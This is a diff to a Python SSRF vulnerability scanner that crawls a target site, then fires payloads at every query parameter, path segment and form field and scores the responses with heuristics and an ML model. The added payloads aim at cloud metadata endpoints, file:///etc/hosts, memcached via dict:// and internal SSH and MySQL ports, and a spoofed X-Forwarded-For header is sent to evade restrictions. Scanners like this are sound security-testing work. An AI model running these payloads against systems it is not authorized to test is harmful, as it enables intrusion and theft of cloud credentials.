@@ -9,6 +9,9 @@ from bs4 import BeautifulSoup
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from selenium.webdriver.common.by import By
+from datetime import datetime
+import warnings
 
 # Import minimal required ML components
 import numpy as np
@@ -159,54 +162,23 @@ def load_ml_model(quiet=False):
     """
     Load the trained ML model without displaying graphs/visualizations
     """
-    # First try to load directly from pickle file
-    model_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "decision_tree_model.pkl")
-    if os.path.exists(model_path):
-        try:
-            with open(model_path, "rb") as f:
-                model = pickle.load(f)
-            if not quiet:
-                print("[+] Successfully loaded pre-trained SSRF detection model")
-            return model
-        except Exception as e:
-            if not quiet:
-                print(f"[-] Error loading model from file: {e}")
-    
-    # If pickle load fails, try to import from module with visualization suppression
     try:
-        # Import matplotlib and completely disable plotting functionality
-        import matplotlib
-        matplotlib.use('Agg')  # Non-interactive backend
-        import matplotlib.pyplot as plt
-        old_show = plt.show
-        plt.show = lambda *args, **kwargs: None  # No-op function
-        
-        # Now try to import the module
-        spec = importlib.util.spec_from_file_location(
-            "ml_ssrf_remediation", 
-            os.path.join(os.path.dirname(os.path.abspath(__file__)), "ml_ssrf_remediation.py")
-        )
-        if spec and spec.loader:
-            module = importlib.util.module_from_spec(spec)
-            spec.loader.exec_module(module)
-            
-            # Restore plt.show
-            plt.show = old_show
-            
-            if hasattr(module, 'loaded_model'):
+        # First try to load directly from pickle file
+        model_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "decision_tree_model.pkl")
+        if os.path.exists(model_path):
+            try:
+                with open(model_path, "rb") as f:
+                    model = pickle.load(f)
                 if not quiet:
-                    print("[+] Using trained model from ml_ssrf_remediation.py")
-                return module.loaded_model
-            elif hasattr(module, 'dt_model'):
+                    print("[+] Successfully loaded pre-trained SSRF detection model")
+                return model
+            except Exception as e:
                 if not quiet:
-                    print("[+] Using decision tree model from ml_ssrf_remediation.py")
-                return module.dt_model
-    
+                    print(f"[-] Error loading model from file: {e}")
     except Exception as e:
         if not quiet:
-            print(f"[-] Error importing ml_ssrf_remediation module: {e}")
+            print(f"[-] Error loading ML model: {e}")
     
-    # Return None if no model found
     if not quiet:
         print("[!] No SSRF detection model available - will use heuristic detection only")
     return None
@@ -237,8 +209,7 @@ def selenium_crawl(driver, url, visited, base_domain, max_depth=3, depth=0):
     print(f"Crawling: {url} (Depth: {depth})")
     try:
         driver.get(url)
-        # Wait briefly for dynamic content to load
-        time.sleep(2)
+        time.sleep(3)
     except Exception as e:
         print(f"Error loading {url}: {e}")
         return []
@@ -247,21 +218,36 @@ def selenium_crawl(driver, url, visited, base_domain, max_depth=3, depth=0):
     soup = BeautifulSoup(html, 'html.parser')
     found_urls = []
     
-    # Find links from anchor tags
-    for link in soup.find_all('a', href=True):
-        href = link.get('href')
-        full_url = urljoin(url, href)
-        parsed_full = urlparse(full_url)
-        if is_valid_url(full_url) and parsed_full.netloc == base_domain and full_url not in visited:
-            found_urls.append(full_url)
-            found_urls.extend(selenium_crawl(driver, full_url, visited, base_domain, max_depth, depth + 1))
+    url_patterns = {
+        'a': 'href',
+        'img': 'src',
+        'form': 'action',
+        'iframe': 'src',
+        'script': 'src',
+        'link': 'href',
+        'object': 'data'
+    }
     
-    # Find form actions
-    for form in soup.find_all('form', action=True):
-        action = form.get('action')
-        form_url = urljoin(url, action)
-        if is_valid_url(form_url) and urlparse(form_url).netloc == base_domain and form_url not in visited:
-            found_urls.append(form_url)
+    for tag, attr in url_patterns.items():
+        for element in soup.find_all(tag, **{attr: True}):
+            href = element.get(attr)
+            full_url = urljoin(url, href)
+            parsed_full = urlparse(full_url)
+            if is_valid_url(full_url) and parsed_full.netloc == base_domain and full_url not in visited:
+                found_urls.append(full_url)
+                if depth < max_depth:
+                    found_urls.extend(selenium_crawl(driver, full_url, visited, base_domain, max_depth, depth + 1))
+    
+    # Find potential SSRF endpoints in JavaScript
+    scripts = soup.find_all('script')
+    for script in scripts:
+        if script.string:
+            # Look for URLs in JavaScript
+            js_urls = re.findall(r'["\']((http[s]?://|/)(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\\(\\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+)["\']', script.string)
+            for js_url in js_urls:
+                full_url = urljoin(url, js_url[0])
+                if is_valid_url(full_url) and urlparse(full_url).netloc == base_domain and full_url not in visited:
+                    found_urls.append(full_url)
     
     return list(set(found_urls))
 
@@ -270,14 +256,27 @@ def find_ssrf_candidates(urls):
     Identify URLs with query parameters commonly used in SSRF vulnerabilities
     """
     candidates = []
-    pattern = re.compile(r'(url|uri|target|path|file|redirect|src|dest|location|href|site|go|image|proxy|content)', re.IGNORECASE)
+    
+    # Consider ALL URLs with parameters as potential SSRF candidates
     for url in urls:
         parsed = urlparse(url)
-        qs = parse_qs(parsed.query)
-        for param in qs:
-            if pattern.search(param):
+        
+        # Add all URLs with query parameters
+        if parsed.query:
+            candidates.append(url)
+            continue
+            
+        # Check path components for potential SSRF endpoints
+        path_parts = parsed.path.split('/')
+        for part in path_parts:
+            if part and part not in ['css', 'js', 'images', 'assets', 'fonts']:
                 candidates.append(url)
                 break
+    
+    # If no candidates are found, test all URLs as a fallback
+    if not candidates and urls:
+        candidates = urls
+    
     return list(set(candidates))
 
 def determine_cwe_id(url, payload, response_data):
@@ -367,14 +366,15 @@ def predict_ssrf_vulnerability(model, url, response_data, payload):
         confidence += 0.1  # Significant timing differences
     
     # Use ML model if available for more accurate prediction
-    predicted_mitigation = None
-    if model and hasattr(model, 'predict'):
+    if model is not None:
         try:
-            # Create input features for ML model - use only numeric features
-            # to avoid the "no valid feature names" warning
+            # Skip ML prediction if sklearn is not available
+            import sklearn
+            # Create input features for ML model with feature names
+            feature_names = ['cwe_id', 'attack_type']
             ml_features = np.array([[features['cwe_id'], features['attack_type']]])
+            
             prediction = model.predict(ml_features)[0]
-            predicted_mitigation = prediction
             
             # Calculate ML-based confidence boost
             if attack_type_code in [1, 4, 5]:  # Cloud, Internal, Protocol Abuse
@@ -391,7 +391,11 @@ def predict_ssrf_vulnerability(model, url, response_data, payload):
                     confidence = 0.4 * confidence + 0.6 * max_prob
                 except Exception:
                     pass
+        except ImportError:
+            # If sklearn is not available, continue with heuristic confidence
+            pass
         except Exception as e:
+            # If ML prediction fails, continue with heuristic confidence
             pass
     
     # Get specific mitigation based on attack type and CWE ID
@@ -414,7 +418,25 @@ def test_ssrf(url, ml_model=None):
     results = {}
     parsed = urlparse(url)
     qs = parse_qs(parsed.query)
-    pattern = re.compile(r'(url|uri|target|path|file|redirect|src|dest|location|href|site|go|image|proxy|content)', re.IGNORECASE)
+    
+    # Enhanced pattern for SSRF parameters
+    pattern = re.compile(r'(url|uri|target|path|file|redirect|src|dest|location|href|site|go|image|proxy|content|fetch|load|read|get|download|upload|preview|view)', re.IGNORECASE)
+    
+    # Additional SSRF payloads
+    additional_payloads = [
+        'http://127.1/test',
+        'http://0.0.0.0/test',
+        'http://localhost.localdomain/test',
+        'http://[::]:80/',
+        'http://[0:0:0:0:0:ffff:127.0.0.1]/',
+        'file:///etc/hosts',
+        'dict://127.0.0.1:11211/stat',
+        'https://metadata.google.internal/computeMetadata/v1/',
+        'http://169.254.169.254/latest/meta-data/',
+        'http://127.0.0.1:22',
+        'http://127.0.0.1:3306'
+    ]
+    ssrf_payloads.extend(additional_payloads)
     
     # Get original response for comparison
     original_response = None
@@ -433,68 +455,117 @@ def test_ssrf(url, ml_model=None):
         print(f"[-] Error fetching original URL {url}: {e}")
         original_response = None
     
+    # If there are no query parameters but there's a path, try to test it with path modifications
+    if not qs and parsed.path:
+        # Create a fake parameter to test
+        path_parts = parsed.path.split('/')
+        for i, part in enumerate(path_parts):
+            if part and part not in ['css', 'js', 'images', 'assets', 'fonts']:
+                for payload in ssrf_payloads[:5]:  # Try first 5 payloads for path-based testing
+                    modified_path = list(path_parts)
+                    modified_path[i] = payload
+                    new_path = '/'.join(modified_path)
+                    modified_url = urlunparse((parsed.scheme, parsed.netloc, new_path, 
+                                              parsed.params, parsed.query, parsed.fragment))
+                    
+                    try:
+                        # Test the modified path
+                        custom_headers = {
+                            'X-Forwarded-For': '127.0.0.1',
+                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                        }
+                        
+                        start_time = time.time()
+                        resp = requests.get(modified_url, timeout=5, allow_redirects=False, headers=custom_headers)
+                        end_time = time.time()
+                        response_time = end_time - start_time
+                        
+                        response_data = {
+                            "status_code": resp.status_code,
+                            "content_length": len(resp.content),
+                            "payload": payload,
+                            "headers": dict(resp.headers),
+                            "response_time": response_time
+                        }
+                        
+                        # Compare with original response
+                        if original_response:
+                            response_data["content_different"] = (hash(resp.text[:500]) != original_response["content_hash"])
+                            response_data["timing_diff"] = abs(response_time - original_response["response_time"])
+                            
+                            # Analyze the response for indicators of SSRF
+                            prediction = predict_ssrf_vulnerability(ml_model, url, response_data, payload)
+                            
+                            # If the confidence is high enough, add to results
+                            if prediction["confidence"] >= 0.5:
+                                if "path_tests" not in results:
+                                    results["path_tests"] = []
+                                results["path_tests"].append(prediction)
+                    except Exception as e:
+                        continue
+    
+    # Test all parameters regardless of name
     for param in qs:
-        if pattern.search(param):
-            param_results = {}
-            
-            for payload in ssrf_payloads:
-                qs_modified = qs.copy()
-                qs_modified[param] = [payload]
-                new_query = urlencode(qs_modified, doseq=True)
-                modified_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
-                                          parsed.params, new_query, parsed.fragment))
-                try:
-                    # Adding custom headers to potentially bypass restrictions
-                    custom_headers = {
-                        'X-Forwarded-For': '127.0.0.1',
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-                    }
+        param_results = {}
+        
+        for payload in ssrf_payloads:
+            qs_modified = qs.copy()
+            qs_modified[param] = [payload]
+            new_query = urlencode(qs_modified, doseq=True)
+            modified_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
+                                      parsed.params, new_query, parsed.fragment))
+            try:
+                # Adding custom headers to potentially bypass restrictions
+                custom_headers = {
+                    'X-Forwarded-For': '127.0.0.1',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                }
+                
+                start_time = time.time()
+                resp = requests.get(modified_url, timeout=5, allow_redirects=False, headers=custom_headers)
+                end_time = time.time()
+                response_time = end_time - start_time
+                
+                response_data = {
+                    "status_code": resp.status_code,
+                    "content_length": len(resp.content),
+                    "payload": payload,
+                    "headers": dict(resp.headers),
+                    "response_time": response_time
+                }
+                
+                # Detect content changes more thoroughly
+                if original_response:
+                    # Check content hash
+                    content_hash = hash(resp.text[:500])
+                    content_different = (content_hash != original_response["content_hash"])
                     
-                    start_time = time.time()
-                    resp = requests.get(modified_url, timeout=5, allow_redirects=False, headers=custom_headers)
-                    end_time = time.time()
-                    response_time = end_time - start_time
+                    # Check headers for SSRF indicators
+                    if not content_different:
+                        # Check for specific header changes that might indicate SSRF
+                        header_diff = False
+                        for key in ['server', 'x-powered-by', 'content-type']:
+                            if (key in resp.headers) != (key in original_response["headers"]):
+                                header_diff = True
+                                break
+                        if header_diff:
+                            content_different = True
+                            
+                    # Check for timing differences
+                    timing_diff = abs(response_time - original_response["response_time"])
+                    response_data["timing_diff"] = timing_diff
                     
-                    response_data = {
-                        "status_code": resp.status_code,
-                        "content_length": len(resp.content),
-                        "payload": payload,
-                        "headers": dict(resp.headers),
-                        "response_time": response_time
-                    }
-                    
-                    # Detect content changes more thoroughly
-                    if original_response:
-                        # Check content hash
-                        content_hash = hash(resp.text[:500])
-                        content_different = (content_hash != original_response["content_hash"])
-                        
-                        # Check headers for SSRF indicators
-                        if not content_different:
-                            # Check for specific header changes that might indicate SSRF
-                            header_diff = False
-                            for key in ['server', 'x-powered-by', 'content-type']:
-                                if (key in resp.headers) != (key in original_response["headers"]):
-                                    header_diff = True
-                                    break
-                            if header_diff:
-                                content_different = True
-                                
-                        # Check for timing differences
-                        timing_diff = abs(response_time - original_response["response_time"])
-                        response_data["timing_diff"] = timing_diff
-                        
-                        response_data["content_different"] = content_different
-                    
-                    # Get ML prediction
-                    prediction = predict_ssrf_vulnerability(ml_model, modified_url, response_data, payload)
-                    response_data["prediction"] = prediction
-                    
-                    param_results[modified_url] = response_data
-                except Exception as e:
-                    param_results[modified_url] = {"error": str(e), "payload": payload}
-            
-            results[param] = param_results
+                    response_data["content_different"] = content_different
+                
+                # Get ML prediction
+                prediction = predict_ssrf_vulnerability(ml_model, modified_url, response_data, payload)
+                response_data["prediction"] = prediction
+                
+                param_results[modified_url] = response_data
+            except Exception as e:
+                param_results[modified_url] = {"error": str(e), "payload": payload}
+        
+        results[param] = param_results
     
     return results
 
@@ -512,12 +583,28 @@ def analyze_ssrf_results(ssrf_results):
         high_confidence_predictions = []
         medium_confidence_predictions = []
         
-        for param, param_results in results.items():
+        # Handle both dictionary and list results
+        if isinstance(results, dict):
+            items_to_check = results.items()
+        elif isinstance(results, list):
+            items_to_check = enumerate(results)
+        else:
+            continue
+        
+        for param, param_results in items_to_check:
             # Initialize payload_success_count for each parameter
             payload_success_count = 0
             
-            for test_url, response_data in param_results.items():
-                if "error" in response_data:
+            # Handle both dictionary and list param_results
+            if isinstance(param_results, dict):
+                items_to_analyze = param_results.items()
+            elif isinstance(param_results, list):
+                items_to_analyze = enumerate(param_results)
+            else:
+                continue
+            
+            for test_url, response_data in items_to_analyze:
+                if isinstance(response_data, dict) and "error" in response_data:
                     continue
                 
                 # Count successful payload tests
@@ -530,7 +617,7 @@ def analyze_ssrf_results(ssrf_results):
                     
                     if prediction["confidence"] >= 0.75:
                         high_confidence_predictions.append({
-                            "test_url": test_url,
+                            "test_url": test_url if isinstance(test_url, str) else candidate_url,
                             "attack_type": prediction["attack_type"],
                             "confidence": prediction["confidence"],
                             "cwe_id": prediction.get("cwe_id", 918),
@@ -540,7 +627,7 @@ def analyze_ssrf_results(ssrf_results):
                         })
                     elif prediction["confidence"] >= 0.6:
                         medium_confidence_predictions.append({
-                            "test_url": test_url,
+                            "test_url": test_url if isinstance(test_url, str) else candidate_url,
                             "attack_type": prediction["attack_type"],
                             "confidence": prediction["confidence"],
                             "cwe_id": prediction.get("cwe_id", 918),
@@ -610,55 +697,153 @@ def save_results_to_csv(vulnerability_report, filename="ssrf_results.csv"):
                     'mitigation': pred["mitigation"]
                 })
 
+def extract_and_test_forms(driver, url, ml_model=None):
+    """
+    Extract forms from the webpage and test them for SSRF vulnerabilities
+    """
+    print(f"[*] Checking forms on: {url}")
+    form_results = []
+    
+    try:
+        driver.get(url)
+        time.sleep(2)  # Wait for page to load
+        
+        # Find all forms
+        forms = driver.find_elements(By.TAG_NAME, "form")
+        
+        for i, form in enumerate(forms):
+            print(f"[*] Testing form #{i+1}")
+            form_data = {}
+            
+            # Get form inputs
+            inputs = form.find_elements(By.TAG_NAME, "input")
+            inputs.extend(form.find_elements(By.TAG_NAME, "textarea"))
+            
+            if not inputs:
+                continue
+                
+            # Find action URL
+            action = form.get_attribute("action")
+            method = form.get_attribute("method") or "get"
+            
+            if not action:
+                action = url
+            else:
+                action = urljoin(url, action)
+                
+            form_data["action"] = action
+            form_data["method"] = method
+            
+            # Test each input for SSRF
+            for input_elem in inputs:
+                input_type = input_elem.get_attribute("type")
+                input_name = input_elem.get_attribute("name")
+                
+                if not input_name or input_type in ["submit", "button", "reset", "checkbox", "radio"]:
+                    continue
+                    
+                # Test with SSRF payloads
+                ssrf_payload = "http://127.0.0.1:22"
+                
+                # Create a new WebDriver instance for testing
+                try:
+                    # Submit the form with the payload
+                    driver.get(url)
+                    time.sleep(1)
+                    
+                    # Find the form again
+                    forms = driver.find_elements(By.TAG_NAME, "form")
+                    if i < len(forms):
+                        form = forms[i]
+                        inputs = form.find_elements(By.TAG_NAME, "input")
+                        inputs.extend(form.find_elements(By.TAG_NAME, "textarea"))
+                        
+                        # Input our payload
+                        for inp in inputs:
+                            if inp.get_attribute("name") == input_name:
+                                inp.clear()
+                                inp.send_keys(ssrf_payload)
+                                
+                        # Submit the form
+                        submit_buttons = form.find_elements(By.XPATH, ".//input[@type='submit']")
+                        if submit_buttons:
+                            submit_buttons[0].click()
+                        else:
+                            form.submit()
+                            
+                        time.sleep(2)
+                        
+                        # Get current URL and test for SSRF
+                        current_url = driver.current_url
+                        test_result = test_ssrf(current_url, ml_model)
+                        
+                        if test_result:
+                            form_data[input_name] = test_result
+                    
+                except Exception as e:
+                    print(f"[-] Error testing form input: {e}")
+                    
+            if any(key != "action" and key != "method" for key in form_data.keys()):
+                form_results.append(form_data)
+    
+    except Exception as e:
+        print(f"[-] Error extracting forms from {url}: {e}")
+        
+    return form_results
+
 def main():
+    """Main function to run the SSRF scanner"""
+    print("===== SSRF Vulnerability Scanner =====")
+    
     if len(sys.argv) < 2:
-        print("Usage: python ssrf_crawler6.py <base_url>")
+        print("Usage: python ssrf_scanner.py <target_url>")
         sys.exit(1)
-    base_url = sys.argv[1]
-    base_domain = urlparse(base_url).netloc
     
-    print("\n===== SSRF Vulnerability Scanner =====")
-    print(f"Target: {base_url}")
+    target_url = sys.argv[1]
+    print(f"Target: {target_url}")
     
-    # Load ML model for SSRF classification
+    # Load ML model for SSRF detection
     ml_model = load_ml_model()
     
     driver = init_driver()
     
+    # Parse base domain for crawling
+    parsed_target = urlparse(target_url)
+    base_domain = parsed_target.netloc
+    
     print("\n[*] Starting dynamic crawl...")
     visited = set()
-    all_urls = selenium_crawl(driver, base_url, visited, base_domain, max_depth=3)
-    print(f"[+] Found {len(all_urls)} internal URLs")
+    discovered_urls = selenium_crawl(driver, target_url, visited, base_domain, max_depth=3)
+    print(f"[+] Found {len(discovered_urls)} internal URLs")
     
-    candidates = find_ssrf_candidates(all_urls)
-    print(f"[*] Testing {len(candidates)} potential SSRF endpoints")
+    # Find potential SSRF endpoints
+    ssrf_candidates = find_ssrf_candidates(discovered_urls)
+    print(f"[*] Testing {len(ssrf_candidates)} potential SSRF endpoints")
     
-    # Look for additional candidates based on common SSRF patterns
-    for url in all_urls:
-        # Check for common SSRF vulnerability patterns in URL paths
-        if any(pattern in url.lower() for pattern in ['redirect', 'url', 'link', 'go', 'return', 'continue']):
-            if url not in candidates:
-                candidates.append(url)
-                print(f"[+] Added potential SSRF endpoint: {url}")
-    
+    # Test each candidate URL for SSRF vulnerabilities
     ssrf_results = {}
-    # Use ThreadPoolExecutor to speed up SSRF testing concurrently
-    with ThreadPoolExecutor(max_workers=10) as executor:
-        future_to_candidate = {executor.submit(test_ssrf, candidate, ml_model): candidate for candidate in candidates}
-        for future in as_completed(future_to_candidate):
-            candidate = future_to_candidate[future]
-            try:
-                test_results = future.result()
-                ssrf_results[candidate] = test_results
-            except Exception as e:
-                print(f"[-] Error testing {candidate}: {str(e)}")
-                ssrf_results[candidate] = {"error": str(e)}
+    total = len(ssrf_candidates)
+    
+    for i, candidate in enumerate(ssrf_candidates, 1):
+        try:
+            # Create progress bar
+            progress = int((i / total) * 50)  # 50 is the width of the progress bar
+            bar = '=' * progress + '-' * (50 - progress)
+            percentage = (i / total) * 100
+            
+            # Print progress bar
+            print(f'\r[{bar}] {percentage:.1f}% ({i}/{total}) Testing: {candidate[:30]}...', end='')
+            
+            test_results = test_ssrf(candidate, ml_model)
+            ssrf_results[candidate] = test_results
+        except Exception as e:
+            print(f"\n[-] Error testing {candidate}: {str(e)}")
+            ssrf_results[candidate] = {"error": str(e)}
+    
+    print("\n")  # New line after progress bar completes
     
     # Analyze results to find vulnerabilities
     vulnerability_report = analyze_ssrf_results(ssrf_results)
-    
-    # Add vulnerability report to results
-    ssrf_results["vulnerability_report"] = vulnerability_report
     
     # Save detailed results to JSON
     with open("ssrf_results.json", "w") as f:
@@ -669,8 +854,8 @@ def main():
     
     # Print summary
     print("\n===== SSRF Scan Results =====")
-    print(f"Total URLs scanned: {len(all_urls)}")
-    print(f"Potential SSRF endpoints tested: {len(candidates)}")
+    print(f"Total URLs scanned: {len(discovered_urls)}")
+    print(f"Potential SSRF endpoints tested: {len(ssrf_candidates)}")
     print(f"Confirmed vulnerable endpoints: {len(vulnerability_report['vulnerable_endpoints'])}")
     print(f"Potential vulnerable endpoints: {len(vulnerability_report['potential_endpoints'])}")
     
@@ -705,4 +890,5 @@ def main():
     driver.quit()
 
 if __name__ == '__main__':
+    warnings.filterwarnings('ignore', category=UserWarning, module='sklearn')
     main()
